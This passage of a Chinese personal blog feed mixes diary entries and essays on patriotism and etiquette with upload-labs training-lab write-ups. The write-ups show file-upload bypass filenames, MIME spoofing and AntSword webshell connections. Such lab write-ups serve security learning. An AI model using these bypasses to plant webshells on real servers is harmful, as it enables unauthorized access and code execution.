class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>imagecreatefromjpeg — 由文件或 URL 创建一个新图象<br>imagecreatefromjpeg() 返回一图像标识符，代表了从给定的文件名取得的图像<br>二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符&#x2F;图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。<br>按照原来的方法进行上传，我们可以发现还是可以上传的，但是配合包含漏洞却无法解析，这时我们把上传的图片复制下来用Notepad++打开，发现我们原来写的php代码没有了，这就是二次渲染把我们里面的php代码删掉了。<br>注意，使用Notepad++查看16进制需要安装一个插件：HEX-Editor<br>安装方法：打开Notepad++，在主页面上方找到（插件），然后（插件管理），在可用下搜索 Hex，下载即可。<br>使用方法：打开目标文件，找到（插件）-&gt; Hex-Editor -&gt; View in HEX<br>把原图和它修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，配合包含漏洞，就可以了。<br>具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的，知道怎么解就可以了。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不要只是按照操作，多想想原理。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/qq_46527080/article/details/111701067">upload-labs17关</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;从17关开始，就变得有挑战性了。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>浅谈爱国</title>
    <link href="http://example.com/2022/11/26/%E6%B5%85%E8%B0%88%E7%88%B1%E5%9B%BD/"/>
    <id>http://example.com/2022/11/26/%E6%B5%85%E8%B0%88%E7%88%B1%E5%9B%BD/</id>
    <published>2022-11-25T16:00:00.000Z</published>
    <updated>2022-11-26T16:19:24.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>爱国，似乎是一个不具有讨论性的话题。可能随便在街上问一个人，爱不爱国？恐怕都会答曰：爱国。<br>我仍然想讨论这个话题。</p><span id="more"></span><h1 id="爱国之问"><a href="#爱国之问" class="headerlink" title="爱国之问"></a>爱国之问</h1><p>为什么要爱国呢？是因为享受了国家的福祉而感恩？是因为为了更好的利益？是因为要政府的管理而顺从？还是因为寻求一种归属感？<br>爱国，到底是爱什么？是爱国家里的江山？人民？文化？政府？抑或皆有之。<br>要了解这些，首先需要知道，国家的性质有些什么。我查了下资料，大致上有这些：领土，政府，主权，人民，文化。</p><h1 id="爱国的部分"><a href="#爱国的部分" class="headerlink" title="爱国的部分"></a>爱国的部分</h1><p>既然要爱国，那这些也必定应当爱吧。领土和主权自不必谈，这里主要谈三个部分。</p><h2 id="政府"><a href="#政府" class="headerlink" title="政府"></a>政府</h2><p>政府（英语：Government）是一个政治体系，于某个区域订立、执行法律和管理的一套机构。<br>作为统治人民的机构，它做出对人民有利的事是应当的。因为政府在天然上占据了大量的优势，资源，信息都远超一般人民。倘若只占据好处而无所作为，那政府只是某些人用来谋取利益权势的工具。<br><font color=DarkRed>至于人民是否感谢政府，应当取决于人民自身的意愿，而不该带有强制要求去试图取代人民的感受。比如由政府带头大力宣传应当感激它自身，那恐怕只是一种政治目的或洗脑方式，必须要警惕。</font><br>爱国必然爱政府，当然爱是自由的，或许有的人能找到各种各样的理由爱政府，那没关系，我并不反对。<font color=DarkOliveGreen>只是有一点我必须要提出，爱必须要在了解的前提下才能谈。既然爱政府，那当然应该了解自己所在政府做了些什么事，尤其是对于擅长隐瞒事实的政府。只有在了解好坏并且接受之后，才能理直气壮地说自己爱政府。否则，我认为那只是一种偏见。如果连了解都不愿意真相都不接受，那只是愚蠢无知，没有谈下去的必要。</font></p><h2 id="人民"><a href="#人民" class="headerlink" title="人民"></a>人民</h2><p>人民（英语：People），又译居民、住民、国民，是个人（Person）的复数形集合。<br>国家里的人民，是整个人类的一部分，如果爱人类，那必然也爱人民。当然爱人民不代表爱人类。可一个声称自己爱国的人，会爱人民吗？我对此表示怀疑。当国民遭遇不幸时，是否会感到由衷地悲伤，还是说与我无关，抱着多一事不如少一事的心态。当国民在国际上取得名声时，是否会感到由衷地自豪，还是说无动于衷或是不屑一顾。爱国必然爱人民，如果做不到以上的事，那就不可能是爱人民。不仅如此，居庙堂而为非作歹，有余力却不愿施予。那更是与爱字沾不到边。<br><font color=darkblue>爱，是需要付出心力的，绝不是一句口号，一朝一夕之间的事。</font></p><h2 id="文化"><a href="#文化" class="headerlink" title="文化"></a>文化</h2><p>文化（英语：culture）是一群共同生活在相同自然环境及经济生产方式的人所形成的一种约定俗成潜意识的外在表现。其中之一的意义是“相互通过学习人类思想与行为的精华来达到完美”；广义的文化包括文字、语言、建筑、饮食、工具、技能、技术、知识、习俗、艺术等。<br>文化非常宽泛，如今有着各种各样的文化，这是特定团体的特色产物。而国家的文化与国家大小人民历史等方面都有着密不可分的联系。<br>每个国家都有自己的文化，或许有的在慢慢衰落，有的在逐渐兴起。可无论如何，只要不是糟粕的那一部分文化，都是值得尊重的。<br>一些所谓的爱国者常常喜欢谈论文化入侵，借此排挤他国文化。<font color=brown>我实在是觉得非常搞笑。首先文化入侵是国家与国家之间才考虑的事，个体喜欢什么是自身的自由。然后，一谈到文化入侵，马上想到的是怎么排挤，而不是怎么更好发展自己国家的文化，自欺欺人。不去想如何竞争，只会发动权力去打压，很低级也很蠢。</font><br>怎样体现出爱文化，其实是一件非常困难的事。因为爱文化不代表不能接受其它国家的文化，爱文化也不代表对自己国家的每种文化都全盘接受。我想，只要对自己国家的好的文化，即便不理解，保持着敬意，带着尊重的心，那便是爱文化。</p><h1 id="爱的高下"><a href="#爱的高下" class="headerlink" title="爱的高下"></a>爱的高下</h1><p>在讨论完爱国至少需要爱哪些部分后，接下来便是爱的高下。<br>当国家主动发起战争时，一个爱国的人，他是应当支持还是反对呢？或许有的人会犹豫，但我认为答案很明确，那便是反对。<br>首先，爱国不代表毫无底线。战争是国家之间最糟糕的行为，完全地反人类。难道说因为爱国而杀人就是正确的？可笑之极。<br>其次，爱国应当指出错误而不是容忍。就如一个孩子的成长过程中犯了错，作为父母是应当无所谓，等待酿下大错；还是及时教育避免重复出错呢？答案很明显吧。<br>因此，当一个国家做了错误的事，批判才是正确的行为。而非常可笑的是，有相当多所谓的爱国人士，只会包庇纵容。在我看来，这根本是虚伪的爱国。<br><font color=blue>对人类而言，首先是做人，然后再谈爱国。</font>就像逻辑推理，先有大前提才有小前提。违背良心与道德底线，是违背人的标准。人类都不复存在了更何况国家之事。<br>常常有人说，爱它就去改变它，对它不满就去改变它。可我想说如果一个国家烂到根里了，无论园丁怎么修剪枝叶，无论施加多少肥料，也是毫无意义。满腔热血终会被凉水泼冷，怂恿下火海终将万劫不复，爱国是否值得也有待商榷。<br>小家与大家之间的冲突问题。的确，古人云，皮之不存毛将焉附，覆巢之下安有完卵。面对外敌入侵，人民把国家放在第一位并没有问题。<br>没有外敌入侵时，国家做了不合理的措施，让人民来承担过失，我是坚决不同意的。捍卫自己与自己周边的利益，即便是国家也不能退让。<br><font color=red>做公民，不要做奴隶。<br></font></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单地讨论了以上几点后，我想，可以过滤掉一大部分自称的“爱国人士”。<br>爱国也并非总是位居最高位，当国家的所作所为违背了人类的基本准则，那是应当反对的。<br>当国家的所作所为侵害了个人权益，即便是国家也不应让步（仅限于能够抗议的政府，独裁政府不在此列，保护自身及周边人安全最重要）。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实想写这么一篇文章，是因周围有人宣称自己爱国，我便思考什么是爱国，算是临时想的，写得并不算好，我自己也不太满意。以后有新的思考再补充吧，权当留个引子。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;爱国，似乎是一个不具有讨论性的话题。可能随便在街上问一个人，爱不爱国？恐怕都会答曰：爱国。&lt;br&gt;我仍然想讨论这个话题。&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
    <category term="爱国" scheme="http://example.com/tags/%E7%88%B1%E5%9B%BD/"/>
    
  </entry>
  
  <entry>
    <title>浅谈礼仪的对象</title>
    <link href="http://example.com/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/"/>
    <id>http://example.com/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/</id>
    <published>2022-11-25T16:00:00.000Z</published>
    <updated>2022-11-27T06:14:33.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。<br>文章还在草稿中…不必看</p><span id="more"></span><h1 id="理所应当的礼仪"><a href="#理所应当的礼仪" class="headerlink" title="理所应当的礼仪"></a>理所应当的礼仪</h1><p>像我这样愚笨之人，从不会思考这样的事，只把这样的礼仪当作是理所当然的事。<br>也即，我被社会，所同化了。<br>为什么这么说呢？<br>仔细思考一下便知，我们的周围，无不充斥着晚辈应当尊敬长辈，学生应当尊重老师，这样的氛围。比如什么一日为师终生为父这样的话。<br>但从来没有长辈尊重晚辈，老师尊重学生的话出现。现实中也常常看到这样的例子，有的老师羞辱学生而学生不敢还嘴，长辈打骂晚辈却不会受到谴责。<br>仿佛只要是成为了这样一种强势地位的人，就能为所欲为。<br>说到底，为什么要对长辈，老师这样的人有尊重的礼仪呢？<br>这些礼仪最初是由什么人提出的呢？难道其实说，这不过是强者剥削弱者的一种手段吗？<br>礼仪道德的遵守与否，应当遵循自愿，而不是成为一种强制行为。对于敬爱的长辈老师，晚辈学生可以自主选择遵守礼仪。对于不值得尊重的，也可以选择不遵守。而不是依靠这样一种强势地位去压迫弱势地位的晚辈学生。<br>说到底，晚辈学生，根本上而言，没有选择权。一切都是上位者提出的规则。他们受到礼仪，只是单纯地享受。<br>未完待续…</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。&lt;br&gt;文章还在草稿中…不必看&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
    <category term="礼仪" scheme="http://example.com/tags/%E7%A4%BC%E4%BB%AA/"/>
    
  </entry>
  
  <entry>
    <title>宁为玉碎</title>
    <link href="http://example.com/2022/11/25/Diary_1125/"/>
    <id>http://example.com/2022/11/25/Diary_1125/</id>
    <published>2022-11-24T16:00:00.000Z</published>
    <updated>2022-11-25T17:16:49.949Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5.png" alt="凉宫春日"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我的生活一如既往，平淡且平静。不过今天似乎在乌鲁木齐没有那么安宁，然而我也做不了什么。逝者愿安息，生者愿平安。</p><h1 id="点滴"><a href="#点滴" class="headerlink" title="点滴"></a>点滴</h1><p>今天的学习状态还是比较满意的，只是学习时长不够长。今日杂务做完了，明天多学习，尤其English!<br>学到了一个小知识：喝水温度对65℃以上对口腔不好。感受到烫一般是50℃以上。<br>昨晚又晚睡了，这不好，再次提醒自己要早睡。早起吃早餐听听力。</p><h1 id="激进分子"><a href="#激进分子" class="headerlink" title="激进分子"></a>激进分子</h1><p>No progress without radicals.没有激进分子就没有进步。<br>这是我今天听听力，听到的一句话。其实没预料到，听听力也能听出一些深刻的话。遇到了一篇蛮有趣的文章。<br>想想其实的确如此，很多事物的改变就是来源于“激进分子”。当然，这个激进分子是广义上的。<br>比如乔布斯，在各个手机厂商都流行在手机上加更多的键时，他一意孤行选择了只给手机保留一个键，这何尝不是一种激进呢？<br>还有很多例子，都可以说明，激进并不一定是一件坏事。<br>社会的大多数人，都是倾向于稳定的。因此激进很容易被反对，也不会被大多数人所理解。这也意味着，激进分子是少数人的“特权”。<br>具前瞻性的言论未必会为时人所接受。但当时间证明了该言论的价值时，社会各界又会争相附和。<br>这就和之前的“不容，然后见君子”其实是联系到一起了。<br>本质上表达的思想是相同的。<br>当然，激进并非代表愚昧的激进，而是明智的激进才是有益的。愚蠢的激进只是滑稽的表演。<br>最后，未来想要更激进一点，如果有人用radical来形容我，我想我会把这个词当作称赞的。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>再借我一点时间吧，我会更珍惜的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5.png&quot; alt=&quot;凉宫春日&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_5-10</title>
    <link href="http://example.com/2022/11/25/upload-labs_5-10/"/>
    <id>http://example.com/2022/11/25/upload-labs_5-10/</id>
    <published>2022-11-24T16:00:00.000Z</published>
    <updated>2022-11-25T16:07:56.943Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…<br>这三关比较像，所以一起写了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h2><p><strong>黑名单过滤（后缀名特殊字符多写）</strong><br>尝试其它都无法成功，因此选择特殊字符重写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php. .         在php后加一个点，加一个空格，再加一个点，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功。</p><h2 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h2><p><strong>黑名单过滤（大小写绕过）</strong><br>尝试其它都无法成功，因此选择大小写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.Php            任意改变php的大小写，上传成功</span><br></pre></td></tr></table></figure><p>正常情况下，蚁剑按正常后缀连接成功<br>PS: 我的出问题了，文件能上传，但打开文件时会出现HTTP500错误，没有找到原因，只能重装phpstudy解决</p><h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><p><strong>黑名单过滤（空格绕过）</strong><br>尝试其它都无法成功，因此选择空格绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php            在php后加一个空格，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功</p><h2 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h2><p><strong>黑名单过滤（点绕过）</strong><br>尝试其它都无法成功，因此选择点绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php.          在php后加一个点，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功</p><h2 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h2><p><strong>黑名单过滤（流文件绕过）</strong><br>尝试其它都无法成功，因此选择流文件绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php::$DATA    在php后加::$DATA，上传成功</span><br></pre></td></tr></table></figure><p>蚁剑按正常后缀连接成功</p><h2 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h2><p>方法和第5关相同，不过多叙述</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>遇事不决，重装解决</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…&lt;br&gt;这三关比较像，所以一起写了。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>是非成败转头空</title>
    <link href="http://example.com/2022/11/24/Diary_1124/"/>
    <id>http://example.com/2022/11/24/Diary_1124/</id>
    <published>2022-11-23T16:00:00.000Z</published>
    <updated>2022-11-24T18:06:48.367Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E9%9D%A2%E7%A0%81122.jpg" alt="本间芽衣子"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知不觉过去了一天…</p><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>You smiled and talked to me of nothing and I felt that for this I had been waiting long.<br>你微笑地看着我，不说一句话。而我知道，为了这个，我已经等待很久了。</p><h1 id="时间的认知"><a href="#时间的认知" class="headerlink" title="时间的认知"></a>时间的认知</h1><p>零点过的时候，骤然看了下日期，发现周五，以为明日是周末了。一种快乐从我心底迸发，是惊讶的喜悦。可我过了会儿发现，日期是零点过后看的，周五才刚刚开始。我就像走入了周五的循环，第一次认识的时候，它是<strong>末尾</strong>。第二次认识的时候，它是<strong>开始</strong>。下一次认识，恐怕又是<strong>末尾</strong>了吧。<br>好像有什么变了，好像什么都没变。变的是我的认知，不变的是世界的规律。</p><h1 id="一天"><a href="#一天" class="headerlink" title="一天"></a>一天</h1><p>突然想到了穆勒的《功利主义》，好久没读了。这里提醒自己一下，有时间去读。这本书的一些重要思想：</p><ul><li>高级快乐和低级快乐，快乐有质的不同</li><li>调和美德与幸福的冲突，美德也是一种幸福</li><li>正义需要感性的力量，有别于利益</li></ul><p>早上本可吃早餐然后完成“检测”，但我不知道哪根筋抽了，居然在等无谓的人，浪费了足足半小时有余，甚至因此在十一点前就吃了午餐，实在糟糕。然而，因等了人，才知道有另外的渠道查看“码”。让我不禁想到了一句话：一个人能走得更快，一群人能走得更远。<br>所以，我的选择是御风而行，不浪费生命。<br>晚上听听力真糟糕，吵闹混乱使人效率变得低下，早点起听听力，学英语！</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不敢相信，这篇短短日记写了半小时，又睡晚了可恶啊！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E9%9D%A2%E7%A0%81122.jpg&quot; alt=&quot;本间芽衣子&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_2</title>
    <link href="http://example.com/2022/11/24/upload-labs_2/"/>
    <id>http://example.com/2022/11/24/upload-labs_2/</id>
    <published>2022-11-23T16:00:00.000Z</published>
    <updated>2022-11-24T04:13:03.365Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关难度也不大，只是涉及到了新的知识点。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试<br>首先可以尝试传输文件。<br>当我传输一个txt文件时，提示类型错误，但这次和第一关不同，不是弹窗，而是页面直接提示，因此不是前端JavaScript验证。<br>这时我们查看源码，可以看到下面这一段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>从这段代码可以看出，上传文件的途中验证了content-type，并且固定了上传文件类型。这里涉及到了MIME。<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。<br>语法：<br>type&#x2F;subtype<br>用法：<br>客户端：<br>告诉服务端上传文件类型<br>告诉服务端可以接受文件类型<br>服务端：<br>告诉客户端响应数据类型<br>详细参见：<a href="https://www.runoob.com/http/mime-types.html">MIME 类型</a><br>因此可以通过改变content-type来让目标文件上传成功</p></li><li><p>尝试与抓包<br>burp抓包，将content-type更改为image&#x2F;png，然后放包，我们就看到文件上传成功了。<br>然后打开，显示没问题，最终成功！</p></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，没什么难度。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这一关难度也不大，只是涉及到了新的知识点。&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_3</title>
    <link href="http://example.com/2022/11/24/upload-labs_3/"/>
    <id>http://example.com/2022/11/24/upload-labs_3/</id>
    <published>2022-11-23T16:00:00.000Z</published>
    <updated>2022-11-24T10:51:11.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>稍微改改就好，就像化了个妆人就认不出了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>测试<br>首先上传一个php文件，发现失败，显示信息为“提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！”<br>我们可以通过这个错误提示信息看出是黑名单，于是查看源码验证<br>通过源码，可以发现直接进行后缀名过滤，同时删除点，检查大小写去除字符串和空格。<br>但我们注意后缀名过滤的这行代码：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure>可以发现并没有过滤完全，因此我们可以通过更改等价后缀名的方式绕过。<br>那么接下来就是查看有哪些等价后缀名：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语言   等价扩展名</span><br><span class="line">asp    asa, cer, cdx</span><br><span class="line">aspx   ashx, asmx, ascx</span><br><span class="line">php    php2, php3, php4, php5, phps, phtml</span><br><span class="line">jsp    jspx, jspf</span><br></pre></td></tr></table></figure>我们只需要把后缀名改成这些即可。<br>注意，因为默认Apache只解析少数几种后缀格式，所以最好到相应的httpd.conf文件下添加以下语句：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .php5 .php3</span><br></pre></td></tr></table></figure>意即能够解析<br>AddType 指令 作用：在给定的文件扩展名与特定的内容类型之间建立映射 语法：AddType MIME-type extension<br>[extension] …<br>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。<br>AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。</li></ol><h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol start="2"><li>尝试与抓包<br>将文件后缀改为黑名单以外的后缀格式，即可顺利上传。或者通过抓包改后缀名。蚁剑顺利连接</li></ol><h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><ol start="2"><li>尝试与抓包<br>上传文件后缀名依旧是php，但通过burp抓包，然后修改filename，采用双写绕过。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.php::$DA::$DATATA</span><br></pre></td></tr></table></figure>这样就能够顺利上传，放到网页上，删除最后的::$data，网页正常打开。再在蚁剑上建立连接，非常顺利。</li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天在这一关弄了好久，起因却是一个有点儿离谱的原因。网页能打开，蚁剑却连不上。最后才发现，变量名就是密码，我第一关阴差阳错地对了。但我不知道密码要设为变量名，这一关也是随便一个密码，却一直过不了。最终发现是蚁剑的密码和文件内的变量名不同，谨记。<br>下次尽量避开这种失误。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>]]></content>
    
    
